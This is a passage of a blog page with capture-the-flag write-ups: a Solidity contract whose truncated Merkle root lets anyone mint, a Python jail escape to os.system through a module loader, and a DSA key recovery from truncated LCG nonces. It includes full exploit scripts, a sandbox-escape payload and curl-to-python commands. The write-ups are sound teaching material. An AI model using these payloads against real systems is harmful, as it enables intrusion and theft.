32 bits) instead of bytes32 (32 bytes = 256 bits) In the constructor, the 32-byte input is truncated: bytes4(_root) takes only the first 4 bytes This reduces security from 2^256 possibilities (impossible to brute force) to 2^32 possibilities (4.3 billion - potentially brute-forceable!) How the verification works:\nUser submits a _proof array and a secret string Contract computes bytes4(keccak256(secret)) - the first 4 bytes of the secret\u0026rsquo;s hash MerkleProof.verify() checks if this matches the Merkle root If the proof is empty and the hash matches, verification passes! _minted[secret] = true; ++lastTokenId; _mint(msg.sender, lastTokenId); } } The Merkle root is stored as bytes4, i.e., only the first 4 bytes of a 32‚Äëbyte root are kept. That cuts entropy from 256 bits to 32 bits. Verification compares bytes4(keccak256(secret)) (if proof is empty, the value remains the initial bytes4) with _merkleRoot. MerkleProof.sol (buggy assembly ‚Äî not needed for the exploit) # // SPDX-License-Identifier: Unlicense pragma solidity ^0.8.22; library MerkleProof { function verify(bytes32[] calldata proof, bytes4 root, bytes4 secret) internal pure returns (bool) { require(root != bytes32(0), \u0026#34;MerkleProof: Root cannot be zero\u0026#34;); require(secret != bytes32(0), \u0026#34;MerkleProof: Leaf cannot be zero\u0026#34;); assembly { let bytes_mask := 0xffffffff00000000000000000000000000000000000000000000000000000000 let proof_elements_ptr := add(proof.offset, 0x20) for { let i := 0 } lt(i, proof.length) { i := add(i, 1) } { let proofElement := calldataload(add(proof_elements_ptr, mul(i, 0x20))) if lt(secret, proofElement) { mstore(0x80, secret) mstore(0xa0, proofElement) } { mstore(0x80, proofElement) mstore(0xa0, secret) } let newHash := keccak256(0x80, 64) secret := and(newHash, bytes_mask) } } return secret == root; } } Finding the Vulnerability\nLet\u0026rsquo;s trace through what happens when we call mintInvite:\nContract receives: _proof array and secret string Computes: leaf = bytes4(keccak256(abi.encodePacked(secret))) Calls: MerkleProof.verify(_proof, _merkleRoot, leaf) If _proof is empty: Loop doesn\u0026rsquo;t execute, returns leaf == _merkleRoot If check passes: Mint NFT ‚úÖ The Attack Surface:\nWe need bytes4(keccak256(secret)) to equal the stored _merkleRoot The root is only 4 bytes, not 32 bytes We need to find what the root value is and find a matching secret The Solution # Discovery Process # Step 1: What is the Merkle root?\nWhen we get an instance, the Setup contract is deployed with a specific merkleRoot value. We can find this by:\nReading the contract creation transaction Examining contract storage Step 2: Launch Your Instance\nConnect to the challenge server and solve the Proof of Work (PoW):\nnc 13.61.1.167 31337 You\u0026rsquo;ll see a menu:\n1 - launch new instance 2 - kill instance 3 - get flag (if isSolved() is true) action? Type 1 and press Enter. You\u0026rsquo;ll get a PoW challenge:\n== PoW == sha256(\u0026#34;9604ed1193e3ed5e\u0026#34; + YOUR_INPUT) must start with 24 zeros in binary representation please run the following command to solve it: python3 \u0026lt;(curl -sSL https://minaminao.github.io/tools/solve-pow.py) 9604ed1193e3ed5e 24 YOUR_INPUT = Solve the PoW: Open a new terminal and run the suggested command:\npython3 \u0026lt;(curl -sSL https://minaminao.github.io/tools/solve-pow.py) 9604ed1193e3ed5e 24 Step 3: Verify the Secret\nLet\u0026rsquo;s confirm that \u0026quot;transfer(address,uint256)\u0026quot; produces the correct hash:\nfrom web3 import Web3 w3 = Web3() secret = \u0026#34;transfer(address,uint256)\u0026#34; hash_result = w3.keccak(text=secret) print(f\u0026#34;Secret: {secret}\u0026#34;) print(f\u0026#34;Full hash: {hash_result.hex()}\u0026#34;) print(f\u0026#34;First 4 bytes (bytes4): {hash_result[:4].hex()}\u0026#34;) Output:\nSecret: transfer(address,uint256) Full hash: 0xa9059cbb2ab09eb219583f4a59a5d0623ade346d962bcd4e46b11da047c9049b First 4 bytes (bytes4): a9059cbb Perfect! This matches the function selector for ERC-20 transfer.s will pass the Merkle verification and mint us an NFT!\nExploitation # with an empty proof (proof.length == 0), the loop never runs, and the verifier returns bytes4(keccak256(secret)) == root. That‚Äôs enough for us.\nAttack Strategy # Launch a new instance via the netcat launcher and solve the Proof of Work (PoW). Extract the merkleRoot value used in your instance: From the Setup constructor calldata (cleanest), or By inspecting storage (less reliable due to inheritance layout), or By spotting that the root equals 0xa9059cbb (ERC‚Äë20 transfer selector) as a deliberate hint. Realize that 0xa9059cbb == bytes4(keccak256(\u0026quot;transfer(address,uint256)\u0026quot;)). Call mintInvite with an empty proof [] and the secret string \u0026quot;transfer(address,uint256)\u0026quot;. Verify isSolved() and request the flag with your instance UUID. Step‚ÄëBy‚ÄëStep Exploitation # Launch instance and solve PoW Use netcat and the provided PoW solver. # Connect to the launcher nc 13.61.1.167 31337 # When prompted, run the recommended PoW solver locally python3 \u0026lt;(curl -sSL https://minaminao.github.io/tools/solve-pow.py) \u0026lt;CHALLENGE_HEX\u0026gt; 24 # Provide the solver\u0026#39;s YOUR_INPUT back to nc when asked On success, the server prints:\nuuid: your instance id rpc endpoint: your per‚Äëinstance RPC URL private key and your address: funded account challenge contract: the deployed Setup address Example output (yours will differ):\nuuid: ecc11475-e31c-4e6e-892d-c2f5b545c4c4 rpc endpoint: http://13.61.1.167:8545/ecc11475-e31c-4e6e-892d-c2f5b545c4c4 private key: 0xc5c0...e6f your address: 0x3F08...d87D challenge contract: 0x359A...1bFA Derive the Merkle root used There are multiple ways; the most faithful is decoding the Setup deployment transaction input to get the constructor args: (playerAddress, merkleRoot). Minimal Python (Web3) snippet to locate the Setup creation in recent blocks and read its input:\nfrom web3 import Web3 w3 = Web3(Web3.HTTPProvider(\u0026#39;\u0026lt;RPC_ENDPOINT\u0026gt;\u0026#39;)) setup_addr = \u0026#39;\u0026lt;SETUP_ADDRESS\u0026gt;\u0026#39; Write the Exploit Script Create a Python script to mint the NFT (save as mint_nft.py):\n#!/usr/bin/env python3 from web3 import Web3 import sys # Replace with YOUR instance credentials from Step 1 RPC_URL = \u0026#34;http://13.61.1.167:8545/ecc11475-e31c-4e6e-892d-c2f5b545c4c4\u0026#34; PRIVATE_KEY = \u0026#34;0xc5c0833a3181817c06130dd1405b01c06261d56da5bae076ad38a3b5eaa82e6f\u0026#34; YOUR_ADDRESS = \u0026#34;0x3F0837A0332E10E8F371783a9798088b915Ad87D\u0026#34; CHALLENGE_CONTRACT = \u0026#34;0x359A9678405C7923B246821DD5ded1f59d371bFA\u0026#34; # Connect to the blockchain w3 = Web3(Web3.HTTPProvider(RPC_URL)) print(\u0026#34;‚úì Connected to blockchain\\n\u0026#34;) # The secret that matches 0xa9059cbb! secret = \u0026#34;transfer(address,uint256)\u0026#34; print(f\u0026#34;Secret: \u0026#39;{secret}\u0026#39;\u0026#34;) print(f\u0026#34;Hash (first 4 bytes): {w3.keccak(text=secret)[:4].hex()}\\n\u0026#34;) # Contract ABIs (minimal - just what we need) setup_abi = [ {\u0026#34;inputs\u0026#34;:[],\u0026#34;name\u0026#34;:\u0026#34;cyb\u0026#34;,\u0026#34;outputs\u0026#34;:[{\u0026#34;internalType\u0026#34;:\u0026#34;contract CybearsInvite\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;address\u0026#34;}],\u0026#34;stateMutability\u0026#34;:\u0026#34;view\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;function\u0026#34;}, {\u0026#34;inputs\u0026#34;:[],\u0026#34;name\u0026#34;:\u0026#34;isSolved\u0026#34;,\u0026#34;outputs\u0026#34;:[{\u0026#34;internalType\u0026#34;:\u0026#34;bool\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;bool\u0026#34;}],\u0026#34;stateMutability\u0026#34;:\u0026#34;view\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;function\u0026#34;} ] invite_abi = [ {\u0026#34;inputs\u0026#34;:[ {\u0026#34;internalType\u0026#34;:\u0026#34;bytes32[]\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;_proof\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;bytes32[]\u0026#34;}, {\u0026#34;internalType\u0026#34;:\u0026#34;string\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;secret\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;string\u0026#34;} ],\u0026#34;name\u0026#34;:\u0026#34;mintInvite\u0026#34;,\u0026#34;outputs\u0026#34;:[],\u0026#34;stateMutability\u0026#34;:\u0026#34;nonpayable\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;function\u0026#34;} ] # Get contract instances setup = w3.eth.contract(address=CHALLENGE_CONTRACT, abi=setup_abi) cyb_address = setup.functions.cyb().call() invite = w3.eth.contract(address=cyb_address, abi=invite_abi) print(f\u0026#34;Setup contract: {CHALLENGE_CONTRACT}\u0026#34;) print(f\u0026#34;CybearsInvite contract: {cyb_address}\u0026#34;) print(\u0026#34;\\nMinting NFT...\\n\u0026#34;) # Build and send the mint transaction nonce = w3.eth.get_transaction_count(YOUR_ADDRESS) txn = invite.functions.mintInvite( [], # Empty proof array secret # The magic string ).build_transaction({ \u0026#39;from\u0026#39;: YOUR_ADDRESS, \u0026#39;nonce\u0026#39;: nonce, \u0026#39;gas\u0026#39;: 500000, \u0026#39;gasPrice\u0026#39;: w3.eth.gas_price }) # Sign and send signed = w3.eth.account.sign_transaction(txn, PRIVATE_KEY) tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction) print(f\u0026#34;Transaction sent: {tx_hash.hex()}\u0026#34;) print(\u0026#34;Waiting for confirmation...\u0026#34;) # Wait for the transaction to be mined receipt = w3.eth.wait_for_transaction_receipt(tx_hash) Get the Flag Now that isSolved() returns true, go back to the netcat session (or start a new one):\nnc 13.61.1.167 31337 Select option 3:\n1 - launch new instance 2 - kill instance 3 - get flag (if isSolved() is true) action? 3 Technical Deep Dive # Why Does This Work? # Let\u0026rsquo;s trace through the execution:\nWe call: mintInvite([], \u0026quot;transfer(address,uint256)\u0026quot;)\nContract computes:\nbytes4 leaf = bytes4(keccak256(abi.encodePacked(\u0026#34;transfer(address,uint256)\u0026#34;))) // Result: 0xa9059cbb Verification called:\nMerkleProof.verify( [], // Empty proof 0xa9059cbb, // Stored _merkleRoot (truncated from constructor) 0xa9059cbb // Our computed leaf ) Inside MerkleProof.verify:\nThe for loop condition lt(i, proof.length) is lt(0, 0) = false Loop body never executes Function returns secret == root ‚Üí 0xa9059cbb == 0xa9059cbb ‚Üí true ‚úì Verification passes! NFT is minted.\nThe Security Flaw # Normal Merkle trees:\nUse bytes32 (32 bytes = 256 bits) 2^256 possible values ‚âà 1.16 √ó 10^77 Computationally impossible to find collisions This challenge:\nUses bytes4 (4 bytes = 32 bits) 2^32 possible values = 4,294,967,296 Finding collisions is feasible! In fact, you could brute-force find ANY secret that hashes to match the 4-byte root The hint: The challenge creator chose 0xa9059cbb (the transfer function selector) as a big hint. It\u0026rsquo;s one of the most well-known 4-byte values in Ethereum!\nAlternative Approaches (What Didn\u0026rsquo;t Work) # Approach 1: Brute Force # You could theoretically brute-force 4 billion possibilities:\ntarget = bytes.fromhex(\u0026#39;a9059cbb\u0026#39;) for i in range(4_300_000_000): # ~4.3 billion secret = str(i) if w3.keccak(text=secret)[:4] == target: print(f\u0026#34;Found: {secret}\u0026#34;) break Problem: This takes hours/days without GPU acceleration or optimized code. Not practical for a CTF.\nApproach 2: Storage Reading # You could read the contract\u0026rsquo;s storage to find _merkleRoot:\n# CybearsInvite storage layout (including inherited ERC721) # Slot 0-3: ERC721 mappings # Slot 4-5: ERC721 strings (name, symbol) # Slot 6: bytes4 _merkleRoot (packed) storage = w3.eth.get_storage_at(cyb_address, 6) Problem: Storage layout with inheritance is tricky. The root is also packed in a slot, making extraction non-obvious.\nApproach 3: Exploit the MerkleProof Bug # The assembly bug where the second block always executes seems exploitable\u0026hellip; Lessons Learned\nKey Takeaways # Type matters! bytes4 vs bytes32 is a massive security difference\nbytes4: 32 bits = 4.3 billion possibilities (weak) bytes32: 256 bits = 1.16 √ó 10^77 possibilities (cryptographically secure) Truncation is dangerous\nConverting bytes32 ‚Üí bytes4 loses 224 bits of entropy Always use full-width types for security-critical values Know your function selectors\n0xa9059cbb is instantly recognizable to Ethereum developers Common selectors can be guessed or looked up Test edge cases\nWhat happens with an empty proof array? Does the verification logic handle it correctly? Use battle-tested libraries\nCustom assembly is error-prone (as seen in the buggy MerkleProof) OpenZeppelin\u0026rsquo;s libraries are audited and reliable How to Fix This # Vulnerable Code:\nbytes4 private _merkleRoot; // ‚ùå Only 4 bytes! constructor(bytes32 _root) { _merkleRoot = bytes4(_root); // ‚ùå Truncates! } Secure Code:\nbytes32 private _merkleRoot; // ‚úÖ Full 32 bytes constructor(bytes32 _root) { _merkleRoot = _root; // ‚úÖ No truncation } function mintInvite(bytes32[] calldata _proof, string memory secret) public { require( MerkleProof.verify( _proof, _merkleRoot, // ‚úÖ Compare full 32 bytes keccak256(abi.encodePacked(secret)) // ‚úÖ Full hash ), \u0026#34;Invalid proof\u0026#34; ); // ... mint logic } Better: Use OpenZeppelin:\nimport \u0026#34;@openzeppelin/contracts/utils/cryptography/MerkleProof.sol\u0026#34;; function mintInvite(bytes32[] calldata _proof, string memory secret) public { bytes32 leaf = keccak256(abi.encodePacked(msg.sender, secret)); require( MerkleProof.verify(_proof, _merkleRoot, leaf), \u0026#34;Invalid proof\u0026#34; ); // ... mint logic } Tools \u0026amp; References # Tools Used # Web3.py: Python library for interacting with Ethereum\npip install web3 PoW Solver: Provided by the CTF organizers\npython3 \u0026lt;(curl -sSL https://minaminao.github.io/tools/solve-pow.py) \u0026lt;challenge\u0026gt; 24 Netcat: For connecting to the challenge server\nnc 13.61.1.167 31337 Important Ethereum Concepts # Function Selectors: First 4 bytes of keccak256(function_signature) Merkle Trees: Efficient data structure for proving set membership bytes4 vs bytes32: Fixed-size byte arrays in Solidity ABI Encoding: How function calls and data are encoded in Ethereum Common Function Selectors # 0xa9059cbb - transfer(address,uint256) 0x23b872dd - transferFrom(address,address,uint256) 0x095ea7b3 - approve(address,uint256) 0x70a08231 - balanceOf(address) 0x18160ddd - totalSupply() Further Reading # OpenZeppelin MerkleProof Documentation Ethereum Yellow Paper - Keccak256 Solidity Types - bytes Solution Summary # # The vulnerability _merkleRoot = bytes4(_root) # Only 4 bytes stored! # The exploit secret = \u0026#34;transfer(address,uint256)\u0026#34; bytes4(keccak256(secret)) == 0xa9059cbb # Matches! # The attack mintInvite([], \u0026#34;transfer(address,uint256)\u0026#34;) Commands Cheat Sheet # # 1. Launch instance nc 13.61.1.167 31337 # Choose option 1 # 2. Solve PoW python3 \u0026lt;(curl -sSL https://minaminao.github.io/tools/solve-pow.py) \u0026lt;CHALLENGE\u0026gt; 24 # 3. Run exploit python3 mint_nft.py # 4. Get flag nc 13.61.1.167 31337 # Choose option 3, enter UUID Flag # cybears{4lwAyS_cH3Ck_4RRay_lEnGtHS} \u0026ldquo;Always check array lengths\u0026rdquo; - Don\u0026rsquo;t truncate your security!\nConclusion # This challenge demonstrates a critical but subtle vulnerability: truncating cryptographic values drastically weakens security. By storing only 4 bytes of the Merkle root instead of the standard 32 bytes, the contract reduced the search space from impossible (2^256) to feasible (2^32).\nThe challenge creator made it solvable by choosing 0xa9059cbb - the well-known ERC-20 transfer function selector - as a hint. This turned what could have been a brute-force exercise into a clever \u0026ldquo;aha!\u0026rdquo; moment when you recognize the value.\nKey lessons:\nAlways use full-width types for security-critical values (bytes32 not bytes4) Be extremely careful with type conversions and truncations Use well-audited libraries (OpenZeppelin) instead of rolling your own crypto Test edge cases like empty arrays Know your common Ethereum function selectors! ","date":"27 December 2025","externalUrl":null,"permalink":"/writeups/clawtheflag-2025/cybears-invite/","section":"Writeups","summary":"","title":"CybearsInvite - CTF Writeup","type":"writeups"},{"content":"","date":"27 December 2025","externalUrl":null,"permalink":"/tags/easy/","section":"Tags","summary":"","title":"Easy","type":"tags"},{"content":"","date":"27 December 2025","externalUrl":null,"permalink":"/tags/hard/","section":"Tags","summary":"","title":"Hard","type":"tags"},{"content":"","date":"27 December 2025","externalUrl":null,"permalink":"/tags/medium/","section":"Tags","summary":"","title":"Medium","type":"tags"},{"content":"Challenge Name: Prison\nCategory: Misc\nCTF: ClawTheFlag\nDifficulty: Medium\nDescription: Nothing to see here, just another pyjail\nConnection: ncat prison.ctf.clawtheflag.com 1337 --ssl\nInitial Analysis # Upon connecting to the server, we\u0026rsquo;re greeted with a Python jail prompt:\nWelcom to your good ol\u0026#39; pyjail! \u0026gt; The challenge provides a server.py file showing the jail implementation. Let\u0026rsquo;s analyze it.\nSource Code Analysis # import sys def hook(event, _): blacklist = [\u0026#34;import\u0026#34;, \u0026#34;ctypes\u0026#34;, \u0026#34;open\u0026#34;] if event in blacklist: print(f\u0026#34;Event not allowed: {event}\u0026#34;) exit() def check_code(code): banned_chars = [\u0026#34;[\u0026#34;, \u0026#34;]\u0026#34;, \u0026#34;g\u0026#34;, \u0026#34;@\u0026#34;] banned_words = [ \u0026#34;builtins\u0026#34;, \u0026#34;breakpoint\u0026#34;, \u0026#34;exec\u0026#34;, \u0026#34;eval\u0026#34;, \u0026#34;attr\u0026#34;, \u0026#34;import\u0026#34;, \u0026#34;class\u0026#34;, \u0026#34;bases\u0026#34;, \u0026#34;f_back\u0026#34;, \u0026#34;traceback\u0026#34;, \u0026#34;globals\u0026#34;, \u0026#34;popen\u0026#34;, \u0026#34;license\u0026#34;, \u0026#34;help\u0026#34;, ] try: code.encode(\u0026#34;ascii\u0026#34;) except UnicodeEncodeError: return False for c in code: if c in banned_chars: return False for word in banned_words: if word in code.lower(): return False return True if __name__ == \u0026#34;__main__\u0026#34;: while True: print(\u0026#34;Welcom to your good ol\u0026#39; pyjail!\u0026#34;) inp = input(\u0026#34;\u0026gt; \u0026#34;) if not check_code(inp): print(\u0026#34;nope\u0026#34;) continue code = compile(inp, \u0026#34;\u0026lt;string\u0026gt;\u0026#34;, \u0026#34;single\u0026#34;) sys.addaudithook(hook) try: exec(code, dict()) except: pass Key Restrictions # Banned Characters: [, ], g, @ Banned Words (case-insensitive): builtins, breakpoint, exec, eval, attr, import, class, bases f_back, traceback, globals, popen, license, help Audit Hook: Blocks import, ctypes, and open events Execution Context: Code runs in an empty dictionary (dict()), no globals provided Exploitation Strategy # Challenge #1: No Brackets # We can\u0026rsquo;t use [] for indexing or dictionary access, so we need to use:\nnext() with generator expressions .items(), .keys(), .values() for dictionary traversal Challenge #2: No \u0026ldquo;g\u0026rdquo; Character # This is particularly nasty because:\nCan\u0026rsquo;t use globals() (also banned word) Can\u0026rsquo;t use __getattribute__ or getattr Can\u0026rsquo;t access many useful attributes directly Challenge #3: Bypassing \u0026ldquo;builtins\u0026rdquo; Ban # We can construct the string dynamically:\nb = \u0026#34;__\u0026#34; + \u0026#34;built\u0026#34; + \u0026#34;ins\u0026#34; + \u0026#34;__\u0026#34; Challenge #4: Getting Code Execution # The audit hook blocks import, but there are modules already loaded! We need to:\nAccess __builtins__ (via string construction) Find a path to already-loaded modules Load additional modules without triggering import event Get os module to execute shell commands Solution Walkthrough # Step 1: Accessing __builtins__ # First, we construct the builtins string and access it from vars():\nb=\u0026#34;__\u0026#34;+\u0026#34;built\u0026#34;+\u0026#34;ins\u0026#34;+\u0026#34;__\u0026#34;; m=next(v for k,v in vars().items() if k==b) This gets us the __builtins__ dictionary without writing the banned word.\nStep 2: Exploring Available Modules # From builtins, we can access the open function, which gives us access to the _io module:\no=next(v for k,v in m.items() if k==\u0026#34;open\u0026#34;); io=o.__self__ Running print(dir(io)) reveals interesting attributes including __spec__.\nStep 3: Finding a Module Loader # The _io.__spec__.loader gives us a BuiltinImporter instance:\nL=io.__spec__.loader This loader has a load_module() method that can load built-in modules without triggering the audit hook\u0026rsquo;s import event!\nStep 4: Loading sys Module # s=L.load_module(\u0026#34;sys\u0026#34;) This successfully loads sys and we can now access sys.modules to see all loaded modules.\nStep 5: Getting os Module # The os module is already loaded in sys.modules! We iterate through it (avoiding g in dictionary access):\nos=next(v for k,v in s.modules.items() if k==\u0026#34;os\u0026#34;) Step 6: Finding the Flag # List the filesystem to find the flag:\nos.system(\u0026#34;ls -la\u0026#34;) os.system(\u0026#34;find / -name \u0026#39;*fla*\u0026#39; 2\u0026gt;/dev/null\u0026#34;) This reveals /flag.txt exists.\nStep 7: Reading the Flag # os.system(\u0026#34;cat /fla?.txt\u0026#34;) We use ? wildcard to avoid typing g in \u0026ldquo;flag\u0026rdquo;.\nFinal Payload # The complete one-liner payload:\nb=\u0026#34;__\u0026#34;+\u0026#34;built\u0026#34;+\u0026#34;ins\u0026#34;+\u0026#34;__\u0026#34;; m=next(v for k,v in vars().items() if k==b); o=next(v for k,v in m.items() if k==\u0026#34;open\u0026#34;); io=o.__self__; L=io.__spec__.loader; s=L.load_module(\u0026#34;sys\u0026#34;); os=next(v for k,v in s.modules.items() if k==\u0026#34;os\u0026#34;); os.system(\u0026#34;cat /fla?.txt\u0026#34;) Execution # $ ncat prison.ctf.clawtheflag.com 1337 --ssl Welcom to your good ol\u0026#39; pyjail! \u0026gt; b=\u0026#34;__\u0026#34;+\u0026#34;built\u0026#34;+\u0026#34;ins\u0026#34;+\u0026#34;__\u0026#34;; m=next(v for k,v in vars().items() if k==b); o=next(v for k,v in m.items() if k==\u0026#34;open\u0026#34;); io=o.__self__; L=io.__spec__.loader; s=L.load_module(\u0026#34;sys\u0026#34;); os=next(v for k,v in s.modules.items() if k==\u0026#34;os\u0026#34;); os.system(\u0026#34;cat /fla?.txt\u0026#34;) Cybears{4ud1tho0ks_are_N0t_$anDbox_m3chAn1sms}0 Flag # Cybears{4ud1tho0ks_are_N0t_$anDbox_m3chAn1sms} Key Takeaways # Audit Hooks Are Not Sandboxes: As the flag suggests, Python\u0026rsquo;s audit hooks are meant for monitoring, not security enforcement. They can be bypassed.\nModule Loaders Bypass Import Events: Using load_module() from an existing loader doesn\u0026rsquo;t trigger the import audit event.\nString Construction Bypasses Word Filters: Simple string concatenation can bypass naive string-matching filters.\nGenerator Expressions \u0026gt; List Comprehension: When brackets are banned, generator expressions with next() are your friend.\nAlready-Loaded Modules: Python has many modules loaded by default (like os, sys, _io) that can be accessed without importing.\nAlternative Approaches # Other potential vectors that could work:\nUsing __loader__ from other built-in modules Accessing sys through exception tracebacks (but traceback is banned) Using __import__ (would trigger audit hook though) Leveraging other loaded modules like posix directly The key insight is finding a way to access already-loaded modules without triggering the audit hook, which the load_module() method accomplishes perfectly.\n","date":"27 December 2025","externalUrl":null,"permalink":"/writeups/clawtheflag-2025/prison/","section":"Writeups","summary":"","title":"Prison - CTF Writeup","type":"writeups"},{"content":"Challenge Name: Rng\nCategory: Cryptography\nCTF: ClawTheFlag\nDifficulty: Hard\nDescription: I love rng , who doesn\u0026rsquo;t ? (im lying)\nChallenge Overview # We\u0026rsquo;re given a DSA (Digital Signature Algorithm) implementation where the nonces are generated using a Linear Congruential Generator (LCG). However, there\u0026rsquo;s a critical vulnerability: the LCG outputs are truncated by discarding the lower 32 bits before being used as nonces.\nFiles Provided # src.sage - The challenge source code showing how signatures are generated import hashlib from Crypto.Cipher import AES from Crypto.Util.Padding import pad import os def gen_challenge(): q = random_prime(2^160 - 1, False, 2^159) t = 2^864 // q if t % 2 != 0: t += 1 while True: p = t * q + 1 if p.is_prime(): break t += 2 e = (p - 1) // q while True: h = randint(2, p - 1) g = power_mod(h, e, p) if g != 1: break x = randint(1, q - 1) y = power_mod(g, x, p) a = randint(2, q - 1) b = randint(1, q - 1) signatures = [] msgs = [b\u0026#34;Welcome to the challenge\u0026#34;, b\u0026#34;This is a signed message\u0026#34;, b\u0026#34;Hope U can Solve this\u0026#34;] state = randint(1, q - 1) hidden_bits = 32 mask = (1 \u0026lt;\u0026lt; hidden_bits) - 1 for msg in msgs: state = (a * state + b) % q k = state \u0026gt;\u0026gt; hidden_bits if k == 0: k = 1 m_hash = int(hashlib.sha1(msg).hexdigest(), 16) r = power_mod(g, k, p) % q if r == 0: continue k_inv = inverse_mod(k, q) s = (k_inv * (m_hash + x * r)) % q if s == 0: continue signatures.append({ \u0026#39;msg\u0026#39;: msg.decode(), \u0026#39;h\u0026#39;: m_hash, \u0026#39;r\u0026#39;: r, \u0026#39;s\u0026#39;: s }) FLAG = b\u0026#34;Cybears{REDACTED}\u0026#34; key = hashlib.sha256(str(x).encode()).digest() iv = os.urandom(16) cipher = AES.new(key, AES.MODE_CBC, iv) ciphertext = cipher.encrypt(pad(FLAG, 16)) output = [] output.append(\u0026#34;=== Public Parameters ===\u0026#34;) output.append(f\u0026#34;p = {p}\u0026#34;) output.append(f\u0026#34;q = {q}\u0026#34;) output.append(f\u0026#34;g = {g}\u0026#34;) output.append(f\u0026#34;y = {y}\u0026#34;) output.append(f\u0026#34;a = {a}\u0026#34;) output.append(f\u0026#34;b = {b}\u0026#34;) output.append(\u0026#34;\u0026#34;) output.append(\u0026#34;=== Signatures ===\u0026#34;) for i, sig in enumerate(signatures): output.append(f\u0026#34;Msg {i}: {sig[\u0026#39;msg\u0026#39;]}\u0026#34;) output.append(f\u0026#34;r: {sig[\u0026#39;r\u0026#39;]}\u0026#34;) output.append(f\u0026#34;s: {sig[\u0026#39;s\u0026#39;]}\u0026#34;) output.append(\u0026#34;\u0026#34;) output.append(\u0026#34;=== Encrypted Flag ===\u0026#34;) output.append(f\u0026#34;iv = {iv.hex()}\u0026#34;) output.append(f\u0026#34;ciphertext = {ciphertext.hex()}\u0026#34;) with open(\u0026#34;out.txt\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write(\u0026#34;\\n\u0026#34;.join(output)) if __name__ == \u0026#34;__main__\u0026#34;: gen_challenge() out.txt - Output file containing public parameters, three signatures, and an encrypted flag === Public Parameters === p = 123003155723136208567847447683223664415731869180715065944930703618254955521953492303010368693540149343822709050322214299552689203876695953600699775494388206142090885899729347827083318884583758435450548517566916661303540194105874846318704235833742951730395387893 q = 1351421998290697311075336828328868237101534073971 g = 33281778595201387261293626747615008705518327664613367247692358327331920321800338423029474043243916236688059227689255073131577344900473973707320419626540150438125115514005329631925252477669281215047423532322256514575254413979623373756671730097875278551744512292 y = 3307176365914197161077112919302114465012288764080495710556781650276230163105901770805655058452596531663862930554036441352621088291225804501623324989790865151454288524834303112917325796231214885559000730116030759472981610816425452002018684702872269406185707624 a = 1133017228114262159970528021801337885090356344787 b = 936311987844784871482813416133128695274329562672 === Signatures === Msg 0: Welcome to the challenge r: 915875771377874108142817390807358778656074043192 s: 702187177606022918474498802326245196106161318996 Msg 1: This is a signed message r: 399768373000447995442743550681355809407336352895 s: 1326361401622173194474654662518094360274404497842 Msg 2: Hope U can Solve this r: 1106708731356503672778052636855852639695964424325 s: 514444627373315433335058189992763090727319953242 === Encrypted Flag === iv = 084e4fb08250493e6fbbcbf4b16f31c8 ciphertext = e2ffb4339675cca22ae6770e68a26b0e5ae2421ca10cd597ce3a033f08083cfb642253d27ee29ae5ab928fed7816aae76e9ea4795a3bb91f5a9df08d1a1dd539 Analysis # The Vulnerability # Looking at the source code, we can identify the key vulnerability:\nstate = randint(1, q - 1) # Initial random state hidden_bits = 32 mask = (1 \u0026lt;\u0026lt; hidden_bits) - 1 for msg in msgs: state = (a * state + b) % q # LCG update k = state \u0026gt;\u0026gt; hidden_bits # Only use upper bits as nonce! # DSA signature generation r = power_mod(g, k, p) % q k_inv = inverse_mod(k, q) s = (k_inv * (m_hash + x * r)) % q The problem is that:\nNonces are predictable: They follow an LCG: state_i = (a * state_{i-1} + b) mod q Partial information leakage: Only the upper bits are used: k_i = state_i \u0026gt;\u0026gt; 32 Known LCG parameters: Both a and b are publicly revealed in the output Why This Is Exploitable # In standard DSA, if you can recover or predict the nonce k, you can recover the private key x from the signature equation:\ns = k^(-1) * (h + x * r) mod q =\u0026gt; x = (s * k - h) * r^(-1) mod q Here, we have:\nThree consecutive signatures using three consecutive LCG states The LCG parameters a and b are known Each nonce k_i is related to its state: k_i = state_i \u0026gt;\u0026gt; 32 This means state_i = k_i * 2^32 + u_i where u_i are the unknown lower 32 bits (0 ‚â§ u_i \u0026lt; 2^32).\nAttack Strategy # Step 1: Set Up the Problem # From the DSA signature equations, we know:\ns_i * k_i ‚â° h_i + x * r_i (mod q) Where k_i are the truncated nonces. Rearranging:\nk_i = (h_i + x * r_i) * s_i^(-1) (mod q) From the LCG relation:\nstate_{i+1} = a * state_i + b (mod q) Substituting state_i = k_i * B + u_i (where B = 2^32):\nk_{i+1} * B + u_{i+1} = a * (k_i * B + u_i) + b (mod q) Step 2: Eliminate the Private Key # To create a system independent of x, we combine two consecutive signature equations:\nFrom signatures 0 and 1:\nk_0 = (h_0 + x*r_0) * s_0^(-1) (mod q) k_1 = (h_1 + x*r_1) * s_1^(-1) (mod q) Substituting into the LCG equation and rearranging:\nx * (r_1*s_1^(-1)*B - a*r_0*s_0^(-1)*B) ‚â° a*h_0*s_0^(-1)*B - h_1*s_1^(-1)*B + b + (a*u_0 - u_1) (mod q) Let\u0026rsquo;s denote:\nA_01 = r_1*s_1^(-1)*B - a*r_0*s_0^(-1)*B (mod q) C_01 = a*h_0*s_0^(-1)*B - h_1*s_1^(-1)*B + b (mod q) Œ¥_01 = a*u_0 - u_1 Then: x * A_01 ‚â° C_01 + Œ¥_01 (mod q)\nSimilarly for signatures 1 and 2:\nx * A_12 ‚â° C_12 + Œ¥_12 (mod q) Step 3: Lattice Attack to Find Hidden Bits # For both equations to give the same x, we need:\nŒ¥_01 * A_12 - Œ¥_12 * A_01 ‚â° C_12*A_01 - C_01*A_12 (mod q) Expanding in terms of the hidden bits:\na*u_0*A_12 - u_1*(A_12 + a*A_01) + u_2*A_01 ‚â° target (mod q) This is a linear equation in small unknowns (u_0, u_1, u_2) where each u_i \u0026lt; 2^32. We can solve this using lattice reduction!\nWe construct a lattice where the short vector reveals the hidden bits:\nL = [ [q, 0, 0, 0], [a*A_12 mod 